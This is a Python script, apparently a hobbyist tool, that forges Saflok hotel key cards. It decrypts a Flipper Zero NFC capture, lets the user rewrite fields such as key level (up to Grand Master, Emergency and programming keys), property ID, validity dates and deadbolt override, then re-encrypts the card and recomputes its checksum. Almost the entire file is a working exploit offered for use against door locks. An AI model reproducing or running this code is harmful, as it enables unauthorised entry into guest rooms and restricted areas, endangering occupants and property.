#!/bin/env python
import argparse
import re
import time
import sys

# Little orphan annie decoder ring
DECODE_ARRAY = [
    0xEA, 0x0D, 0xD9, 0x74, 0x4E, 0x28, 0xFD, 0xBA, 0x7B, 0x98, 0x87, 0x78, 0xDD, 0x8D, 0xB5,
    0x1A, 0x0E, 0x30, 0xF3, 0x2F, 0x6A, 0x3B, 0xAC, 0x09, 0xB9, 0x20, 0x6E, 0x5B, 0x2B, 0xB6,
    0x21, 0xAA, 0x17, 0x44, 0x5A, 0x54, 0x57, 0xBE, 0x0A, 0x52, 0x67, 0xC9, 0x50, 0x35, 0xF5,
    0x41, 0xA0, 0x94, 0x60, 0xFE, 0x24, 0xA2, 0x36, 0xEF, 0x1E, 0x6B, 0xF7, 0x9C, 0x69, 0xDA,
    0x9B, 0x6F, 0xAD, 0xD8, 0xFB, 0x97, 0x62, 0x5F, 0x1F, 0x38, 0xC2, 0xD7, 0x71, 0x31, 0xF0,
    0x13, 0xEE, 0x0F, 0xA3, 0xA7, 0x1C, 0xD5, 0x11, 0x4C, 0x45, 0x2C, 0x04, 0xDB, 0xA6, 0x2E,
    0xF8, 0x64, 0x9A, 0xB8, 0x53, 0x66, 0xDC, 0x7A, 0x5D, 0x03, 0x07, 0x80, 0x37, 0xFF, 0xFC,
    0x06, 0xBC, 0x26, 0xC0, 0x95, 0x4A, 0xF1, 0x51, 0x2D, 0x22, 0x18, 0x01, 0x79, 0x5E, 0x76,
    0x1D, 0x7F, 0x14, 0xE3, 0x9E, 0x8A, 0xBB, 0x34, 0xBF, 0xF4, 0xAB, 0x48, 0x63, 0x55, 0x3E,
    0x56, 0x8C, 0xD1, 0x12, 0xED, 0xC3, 0x49, 0x8E, 0x92, 0x9D, 0xCA, 0xB1, 0xE5, 0xCE, 0x4D,
    0x3F, 0xFA, 0x73, 0x05, 0xE0, 0x4B, 0x93, 0xB2, 0xCB, 0x08, 0xE1, 0x96, 0x19, 0x3D, 0x83,
    0x39, 0x75, 0xEC, 0xD6, 0x3C, 0xD0, 0x70, 0x81, 0x16, 0x29, 0x15, 0x6C, 0xC7, 0xE7, 0xE2,
    0xF6, 0xB7, 0xE8, 0x25, 0x6D, 0x3A, 0xE6, 0xC8, 0x99, 0x46, 0xB0, 0x85, 0x02, 0x61, 0x1B,
    0x8B, 0xB3, 0x9F, 0x0B, 0x2A, 0xA8, 0x77, 0x10, 0xC1, 0x88, 0xCC, 0xA4, 0xDE, 0x43, 0x58,
    0x23, 0xB4, 0xA1, 0xA5, 0x5C, 0xAE, 0xA9, 0x7E, 0x42, 0x40, 0x90, 0xD2, 0xE9, 0x84, 0xCF,
    0xE4, 0xEB, 0x47, 0x4F, 0x82, 0xD4, 0xC5, 0x8F, 0xCD, 0xD3, 0x86, 0x00, 0x59, 0xDF, 0xF2,
    0x0C, 0x7C, 0xC6, 0xBD, 0xF9, 0x7D, 0xC4, 0x91, 0x27, 0x89, 0x32, 0x72, 0x33, 0x65, 0x68,
    0xAF
]

# See attached PDF for what each one does
KEY_LEVELS = [
    (1, "Guest Key"),
    (2, "Connectors"),
    (3, "Suite"),
    (4, "Limited Use"),
    (5, "Failsafe"),
    (6, "Inhibit"),
    (7, "Pool/Meeting Master"),
    (8, "Housekeeping"),
    (9, "Floor Key"),
    (10, "Section Key"),
    (11, "Rooms Master"),
    (12, "Grand Master"),
    (13, "Emergency"),
    (14, "Electronic Lockout"),
    (15, "Secondary Programming Key (SPK)"),
    (16, "Primary Programming Key (PPK)"),
]

# ANSI color codes
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
PURPLE = "\033[95m"
RESET = "\033[0m"

# Simple validation function to ensure encryption will work correctly
def validate(val, minimum, maximum, text, fmt="int"):
    if not (minimum <= val <= maximum):
        if fmt == 'int':
            mn = minimum
            mx = maximum
            v = val
        elif fmt == 'hex':
            mn = hex(minimum)
            mx = hex(maximum)
            v = hex(val)
        elif fmt == 'bin':
            mn = bin(minimum)
            mx = bin(maximum)
            v = hex(val)
        else:
            raise ValueError("Invalid format string for validation")

        raise ValueError(f"Invalid input: {text} // Valid values: {mn}->{mx} // Given: {v}")

# Borrowed from Momentum firmware saflok.c
# https://github.com/Next-Flip/Momentum-Firmware/blob/dev/applications/main/nfc/plugins/supported_cards/saflok.c
def decrypt_card(ecard_data):
    # Where we put the decrypted card data
    dc = []

    # Setup
    length = 17

    # Stage 1??
    for i in range(0, length):
        num = DECODE_ARRAY[ecard_data[i]] - (i + 1)
        if num < 0:
            num += 256
        dc.append(num)

    # Stage 2
    bob = dc[10]
    # Alice = bob's lsigdig
    alice = bob & 1

    # Stage 3
    # I'm using names here to hopefully make it easier to follow than num1, num2, etc.
    for zeta in range(17, 0, -1):
        bob = dc[zeta - 1]
        for xi in range(8, 0, -1):
            yip = zeta + xi
            if(yip > length):
                yip -= length
            charlie = dc[yip - 1]
            # print(f"charlie({charlie:02x}) = dc[yip({yip:02x}) - 1]")
            # save msigdig from charlie
            david   =  (charlie & 0x80) >> 7
            # print(f"david({david:02x})   =  (charlie({charlie:02x}) & 0x80) >> 7")
            # double charlie, truncate, add alice to the end
            charlie = ((charlie << 1) & 0xFF) | alice
            # print(f"charlie({charlie:02x}) = ((charlie({charlie:02x}) << 1) & 0xFF) | alice({alice:02x})")
            # alice becomes bob's msigdig
            alice   =  (bob & 0x80) >> 7
            # print(f"alice({alice:02x})   =  (bob({bob:02x}) & 0x80) >> 7")
            # bob get's charlie's msigdig
            bob     = ((bob << 1) & 0xFF) | david
            # print(f"bob({bob:02x})     = ((bob({bob:02x}) << 1) & 0xFF) | david({david:02x})")

            dc[yip - 1] = charlie
            # print(f"dc[yip({yip:02x})] = charlie({charlie:02x})")
        dc[zeta - 1] = bob
        # print(f"dc[zeta({zeta:02x})] = bob({bob:02x})")

    return dc

# Reversed version of the decrypt function.
# Author: Gizmonicus, and only Gizmonicus. I'm proud of this one y'all.
# Fixed alice algorithm, checksum seems to pass now and Property Number stays the same
def encrypt_card(dcard_data):
    length = 17
    
    # The challenge: alice is derived from dc[10] after stage 1 of decryption,
    # but dc[10] depends on the encryption which depends on alice!
    # 
    # Solution: Try both possible alice values (0 and 1) and see which one
    # produces an encryption that, when decrypted, gives us back the original data
    # 
    # Important: Both alice values might produce self-consistent results,
    # so we prefer alice=1 when both work (based on empirical testing)
    
    results = []
    
    for test_alice in [0, 1]:
        ec = []
        work_data = dcard_data.copy()
        alice = test_alice
        
        # Stage 3 (reversed from decrypt) - process forward instead of backward
        for zeta in range(1, 18):
            bob = work_data[zeta - 1]
            for xi in range(1, 9):
                yip = zeta + xi
                if yip > length:
                    yip -= length
                charlie = work_data[yip - 1]
                
                # Reverse the bit operations from decrypt
                david = bob & 1
                bob = (bob >> 1) | (alice << 7)
                alice = charlie & 1
                charlie = (charlie >> 1) | (david << 7)
                
                work_data[yip - 1] = charlie
            work_data[zeta - 1] = bob
        
        # Stage 1 (reversed) - encode
        for i in range(0, length):
            num = work_data[i] + (i + 1)
            if num >= 256:
                num -= 256
            ec.append(DECODE_ARRAY.index(num))
        
        # Now check if this encryption is correct by doing stage 1 decrypt
        # and checking if alice matches what we used
        dc10_check = DECODE_ARRAY[ec[10]] - 11
        if dc10_check < 0:
            dc10_check += 256
        alice_check = dc10_check & 1
        
        # Store the result if alice matches
        if alice_check == test_alice:
            results.append((test_alice, ec))
    
    # If both alice values work, prefer alice=1
    # This is based on empirical observation that alice=1 tends to produce
    # the correct encryption for most cards
    if len(results) == 2:
        # Return the result with alice=1
        return results[1][1]
    elif len(results) == 1:
        # Return the only valid result
        return results[0][1]
    else:
        # This shouldn't happen
        raise Exception("Unable to determine correct alice value")

# Decode the card data now that it's not encrypted anymore. Also sourced from
# Momentum firmware.
def decode_card(dcard_data):

    # Here's where we figure out what each byte does
    card = {}

    # Byte 0
    card['key_level'], card['key_level_text'] = KEY_LEVELS[(dcard_data[0] & 0xF0) >> 4]
    card['led_warning'] = (dcard_data[0] & 0x08) >> 3

    # Byte 1
    card['key_id'] = dcard_data[1]

    # Byte 2 & 3
    card['key_record_high'] = dcard_data[2] & 0x7F
    card['opening_key'] = (dcard_data[2] & 0x80) >> 7
    card['key_record'] = (card['key_record_high'] << 8) | dcard_data[3]

    # Byte 5 & 6
    card['sequence'] = ((dcard_data[5] & 0x0F) << 8) | dcard_data[6]

    # Property ID and year, bytes 14 & 15
    card['creation_year_bits'] = (dcard_data[14] & 0xF0)
    card['property_id'] = ((dcard_data[14] & 0x0F) << 8) | dcard_data[15]

    # Byte 7 override deadbolt and days
    card['override_deadbolt'] = (dcard_data[7] & 0x80) >> 7
    card['restricted_weekday'] = dcard_data[7] & 0x7F

    card['interval_year'] = dcard_data[8] >> 4
    card['interval_month'] = dcard_data[8] & 0x0f
    card['interval_day'] = (dcard_data[9] >> 3) & 0x1F
    card['interval_hour'] = ((dcard_data[9] & 0x07) << 2) | (dcard_data[10] >> 6)
    card['interval_minute'] = dcard_data[10] & 0x3F

    # Fix: Match C implementation - OR first, then add 1980
    card['creation_year'] = ((card['creation_year_bits'] | ((dcard_data[11] & 0xF0) >> 4)) + 1980)
    card['creation_month'] = dcard_data[11] & 0x0F;
    card['creation_day'] = (dcard_data[12] >> 3) & 0x1F;
    card['creation_hour'] = ((dcard_data[12] & 0x07) << 2) | (dcard_data[13] >> 6);
    card['creation_minute'] = dcard_data[13] & 0x3F;

    card['checksum'] = dcard_data[16]
    card['csum_pass'] = dcard_data[16] == calculate_checksum(dcard_data)

    return card

# Function for calculating checksums. This is used both for validating existing
# cards as well as forging new ones.
def calculate_checksum(dcard_data):
    # Let's validate the checksum
    calc_sum = 0

    # Duh, checksum isn't part of the checksum, hence 16 instead of 17
    for i in range(0, 16):
        calc_sum += dcard_data[i]

    calc_sum = 255 - (calc_sum & 0xff)

    return calc_sum
    
# Re-encode the card from text. This is the reversed function from decode_card.
# Author: Gizmonicus
def encode_card(card):

    # Initialize all to 0 so we have a valid key
    dcard_data = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

    # Byte 0
    validate(card['key_level'], 1, 16, "key_level")
    validate(card['led_warning'], 0, 1, "led_warning")
    dcard_data[0] = ((card['key_level'] - 1) << 4) | (card['led_warning'] << 3)

    # Byte 1
    validate(card['key_id'], 0, 255, "key_id", fmt="hex")
    dcard_data[1] = card['key_id']

    # Bytes 2 & 3
    validate(card['key_record'], 0, 0x7fff, 'key_record', fmt='hex')
    validate(card['opening_key'], 0, 1, 'opening_key')
    key_record_high = (card['key_record'] & 0xf00) >> 8
    dcard_data[2] = key_record_high | (card['opening_key'] << 7)
    dcard_data[3] = card['key_record'] & 0xff

    # Bytes 5 & 6
    # card['sequence'] = ((dcard_data[5] & 0x0F) << 8) | dcard_data[6]
    validate(card['sequence'], 0, 0xfff, 'sequence', fmt='hex')
    dcard_data[5] = (card['sequence'] & 0xf00) >> 8
    dcard_data[6] = card['sequence'] & 0xff

    # Property ID and year, bytes 14 & 15
    # validate(card['creation_year_bits'], 0x10, 0xf0, 'creation_year_bits') # why?? whatever
    validate(card['property_id'], 0, 4095, 'property_id')
    creation_year_bits = (card['creation_year'] - 1980) & 0xf0
    dcard_data[14] = creation_year_bits | (card['property_id'] & 0xf00) >> 8
    dcard_data[15] = card['property_id'] & 0xff

    # Byte 7 override deadbolt and days
    validate(card['override_deadbolt'], 0, 1, 'override_deadbolt')
    validate(card['restricted_weekday'], 0, 127, 'restricted_weekday', fmt='bin')
    dcard_data[7] = (card['override_deadbolt'] << 7) | card['restricted_weekday']

    # Byte 8 year/month
    validate(card['interval_year'], 0, 15, 'interval_year')
    validate(card['interval_month'], 0, 15, 'interval_month')
    dcard_data[8] = (card['interval_year'] << 4) | card['interval_month']

    # Bytes 9/10 interval day/hr/min
    validate(card['interval_day'], 0, 31, 'interval_day')
    validate(card['interval_hour'], 0, 23, 'interval_hour') # 0-31
    validate(card['interval_minute'], 0, 59, 'interval_minute') # 0-63
    dcard_data[9] = (card['interval_day'] << 3) | ((card['interval_hour'] & 0x1c) >> 2)
    dcard_data[10] = ((card['interval_hour'] & 0x3) << 6) | (card['interval_minute'] & 0x3f)

    # Bytes 11 year/month
    validate(card['creation_year'], 1980, 2235, 'creation_year')
    validate(card['creation_month'], 1, 12, 'creation_month') # 0-15
    dcard_data[11] = (((card['creation_year'] - 1980) & 0xf) << 4) | card['creation_month']

    # Bytes 12/13 day/hr/min
    validate(card['creation_day'], 0, 31, 'creation_day')
    validate(card['creation_hour'], 0, 23, 'creation_hour')
    validate(card['creation_minute'], 0, 59, 'interval_minute') # 0-63
    dcard_data[12] = (card['creation_day'] << 3) | ((card['creation_hour'] & 0x1c) >> 2)
    dcard_data[13] = ((card['creation_hour'] & 0x3) << 6) | (card['creation_minute'] & 0x3f)

    dcard_data[16] = calculate_checksum(dcard_data)
    return dcard_data

# So we don't have to hardcode things. Let's actually read it from, you know, the command line.
def parse_args():

    parser = argparse.ArgumentParser(description="Craft arbitrary Saflok cards using an existing NFC capture file from Flipper. Author: Gizmonicus")

    # Positional arguments (mandatory input and output file)
    parser.add_argument("input_file", type=str, help="Path to the input NFC file. Defaults will be set using this file as the template.")

    # Optional arguments with required types and defaults
    parser.add_argument("--key-level", type=int, help="Key level number (int)")
    parser.add_argument("--led-warning", type=int, choices=[0,1], default=0, help="Enable LED warning (0|1)")
    parser.add_argument("--key-id", type=lambda x: int(x, 16), help="Key ID (1-byte hex)")
    parser.add_argument("--opening-key", type=int, choices=[0, 1], help="Opening key (0|1)")
    parser.add_argument("--key-record", type=lambda x: int(x, 16), help="Key record (1-byte hex)")
    parser.add_argument("--property-id", type=int, help="Property ID (int)")
    parser.add_argument("--override-deadbolt", type=int, choices=[0, 1], help="Override deadbolt (0|1)")
    parser.add_argument("--restricted-weekday", type=lambda x: int(x, 2), help="Restricted weekday (7 digit binary)")
    parser.add_argument("--interval-year", type=int, help="Interval year (int)")
    parser.add_argument("--interval-month", type=int, help="Interval month (int)")
    parser.add_argument("--interval-day", type=int, help="Interval day (int)")
    parser.add_argument("--interval-hour", type=int, help="Interval hour (int)")
    parser.add_argument("--interval-minute", type=int, help="Interval minute (int)")
    parser.add_argument("--creation-year", type=int,  help="Creation year (int)")
    parser.add_argument("--creation-month", type=int, help="Creation month (int)")
    parser.add_argument("--creation-day", type=int, help="Creation day (int)")
    parser.add_argument("--creation-hour", type=int, help="Creation hour (int)")
    parser.add_argument("--creation-minute", type=int, help="Creation minute (int)")
    parser.add_argument("--sequence", type=lambda x: int(x, 16) & 0xFFF, help="Sequence combination number (12-bit hex)")
    parser.add_argument("--output", type=str, help="Path to the output NFC file. If not specified, card data will be printed to stdout.")

    args = parser.parse_args()

    return args

# Author: ChatGPT. I don't regret using the AI on this one. Reads data from .nfc
# files and returns the interesting bytes
def read_flipper_nfc(input_file): 
    block1_pattern = re.compile(r"Block 1:\s+([\dA-Fa-f ]+)")
    block2_pattern = re.compile(r"Block 2:\s+([\dA-Fa-f ]+)")

    block1_data = None
    block2_data = None

    with open(input_file, "r") as file:
        for line in file:
            block1_match = block1_pattern.match(line)
            block2_match = block2_pattern.match(line)

            if block1_match:
                block1_data = [int(x, 16) for x in block1_match.group(1).split()]
            elif block2_match:
                block2_data = [int(x, 16) for x in block2_match.group(1).split()]

            if block1_data is not None and block2_data is not None:
                break  # Stop reading once both blocks are found

    if block1_data is None or block2_data is None:
        raise ValueError("Block 1 or Block 2 not found in the file.")

    # Combine all 16 bytes from Block 1 and the 1st byte from Block 2
    flipper_data = block1_data + [block2_data[0]]

    return flipper_data

# Author: Also ChatGPT. I still don't regret using AI for this. Not an
# interesting problem to solve.
def write_flipper_nfc(input_file, output_file, ecard_data):

    print(f"{GREEN}Writing output to {output_file}{RESET}")
    # Read each line
    with open(input_file, "r") as f:
        lines = f.readlines()

    new_lines = []

    for line in lines:
        match_block1 = re.match(r"Block 1: (.+)", line)
        match_block2 = re.match(r"Block 2: (.+)", line)

        if match_block1:
            # Replace entire Block 1 with first 16 bytes of data
            new_block1 = f"Block 1: {' '.join(f'{byte:02X}' for byte in ecard_data[:16])}"
            new_lines.append(new_block1 + "\n")
        elif match_block2:
            # Replace only the first byte of Block 2
            block2_bytes = match_block2.group(1).split()
            block2_bytes[0] = f"{ecard_data[16]:02X}"  # Replace only the first byte
            new_block2 = f"Block 2: {' '.join(block2_bytes)}"
            new_lines.append(new_block2 + "\n")
        else:
            new_lines.append(line)  # Keep other lines unchanged

    # Write modified content to output file
    with open(output_file, "w") as f:
        f.writelines(new_lines)

# As with any CLI HAXXOR tool, you need ascii art and pretty colors to prove your
# l33tness to the world, right? Yes.
def pretty_print(ctx, ecd):

    # The encoded card data is an array of ints, it needs to be joined as a string of hex bytes
    print_array = []
    for byte in ecd:
        print_array.append(f"{byte:02x}")
    ebytes = " ".join(print_array)

    # Make it nice looking
    print(
        f"{PURPLE} ###### {BLUE}Key Level{RESET}: {ctx['key_level']}\n"
        f"{PURPLE}   #    {BLUE}Key Desc{RESET}: {KEY_LEVELS[ctx['key_level'] - 1][1]}\n"
        f"{PURPLE}    #   {BLUE}LED Warn{RESET}: {ctx['led_warning']}\n"
        f"{PURPLE}   #    {BLUE}Key ID{RESET}: 0x{ctx['key_id']:02x}\n"
        f"{PURPLE} ###### {BLUE}Opening Key{RESET}: {ctx['opening_key']}\n"
        f"{PURPLE}        {BLUE}Key Record{RESET}: 0x{ctx['key_record']:04x}\n"
        f"{PURPLE} ##   # {BLUE}Seq/Combo{RESET}: 0x{ctx['sequence']:03x}\n"
        f"{PURPLE} # #  # {BLUE}Property ID{RESET}: {ctx['property_id']}\n"
        f"{PURPLE} #  # # {BLUE}Override Deadbolt{RESET}: {ctx['override_deadbolt']}\n"
        f"{PURPLE} #   ## {BLUE}Weekdays (mtwtfss){RESET}: {ctx['restricted_weekday']:07b}\n"
        f"{PURPLE}        {BLUE}Valid for{RESET}: {ctx['interval_year']:02d}/{ctx['interval_month']:02d}/{ctx['interval_day']:02d}T{ctx['interval_hour']:02d}:{ctx['interval_minute']:02d}\n"
        f"{PURPLE} #  ### {BLUE}Created{RESET}: {ctx['creation_year']:02d}/{ctx['creation_month']:02d}/{ctx['creation_day']:02d}T{ctx['creation_hour']:02d}:{ctx['creation_minute']:02d}\n"
        f"{PURPLE} #  # # {BLUE}Checksum{RESET}: 0x{ctx['checksum']:02x}\n"
        f"{PURPLE} #    # {BLUE}Checksum Pass{RESET}: {ctx['csum_pass']}\n"
        f"{PURPLE} ###### {BLUE}Encoded Bytes{RESET}: {RED}{ebytes}{RESET}"
    )

# Wait 3 seconds while doing nothing. This makes the program seem more substantial.
def spinner(seconds=3):
    spin_chars = ["|", "/", "-", "\\"]
    end_time = time.time() + seconds
    
    while time.time() < end_time:
        for char in spin_chars:
            print(f"\r{GREEN}Preheating the oven...{RESET} {char}", end="", flush=True)  # Overwrites the same line
            time.sleep(0.1)  # Adjust speed of the spinner

    print(f"\n{GREEN}Saflok key fully baked.{RESET}")

###
# Python implementation of the unsaflok vulnerability
# ---
# Seq/Combo numbers will need to be set appropriately. It's unclear what they
# need to be set to in order to bypass lock security. This was not disclosed by
# the publishers of this vulnerability and may impact the effectiveness of this
# attack. Changing dates on guest keys at a minimum will allow access to common
# areas even with bad sequence numbers.
###
if __name__ == "__main__":

    args = parse_args()

    # Spin for a second to make this look difficult
    spinner()

    # Read in the card data from NFC file
    ecard_data = read_flipper_nfc(args.input_file)

    # Decrypt it...
    dcard_data = decrypt_card(ecard_data)

    # Extract fields...
    card_text = decode_card(dcard_data)

    # Filter crap we don't actually need to set (some fields are derived from others)
    # There's probably a cleaner way to do this, but we're already almost 500 lines long
    del card_text['key_level_text']
    del card_text['key_record_high']
    del card_text['creation_year_bits']
    del card_text['checksum']
    del card_text['csum_pass']

    # If we override any of the existing fields, do that now
    for key in card_text.keys():
        if getattr(args, key) is not None:
            card_text[key] = getattr(args, key)

    # Encode the new card information
    dcard_data = encode_card(card_text)

    # We're going a little around our elbow here, but this will re-add the fields
    # we care about displaying to the screen.
    card_text = decode_card(dcard_data)

    # Re-encrypt the data for writing
    ecard_data = encrypt_card(dcard_data)

    # Show the user the goods
    pretty_print(card_text,ecard_data)

    # If output was asked for, write the data
    if args.output:
       write_flipper_nfc(args.input_file, args.output, ecard_data) 
